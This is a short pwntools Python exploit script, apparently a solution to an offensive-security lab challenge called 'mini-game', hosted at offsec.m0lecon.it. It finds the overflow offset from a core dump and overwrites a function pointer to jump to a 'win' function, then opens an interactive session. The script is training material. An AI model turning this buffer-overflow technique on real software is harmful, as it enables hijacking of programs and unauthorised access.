from pwn import *

ADDR = "offsec.m0lecon.it"
port = 13560

elf = ELF('/home/kali/Desktop/offsec/labs/lab1/materiale/challenges/04-mini-game/mini_game')

context.binary = elf
context.arch = "amd64"
context.os = "linux"

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDR, port)

    return r

def get_ptr_offset():
    # Start a dummy process to crash
    p_crash = process(elf.path)
    
    p_crash.recvuntil(b"go?\n")
    p_crash.sendline(cyclic(200))
    p_crash.wait()
    
    # Grab the core dump generated by the crash
    core = p_crash.corefile

    crash_address = core.rdx    #puts fun_ptr value into rax, then calls rdx. 
    print(crash_address)
    
    offset = cyclic_find(crash_address)

    print(f"Calculated offset to func_ptr: {offset}")
    return offset
    
func_ptr_offset = get_ptr_offset()

win_addr = elf.sym.win
log.info(f"Found 'win' function at: {hex(win_addr)}")

payload = flat(
    b'A' * func_ptr_offset,
    p64(win_addr)
)

r = conn()
r.recvuntil(b"go?\n")

r.sendline(payload)

r.interactive()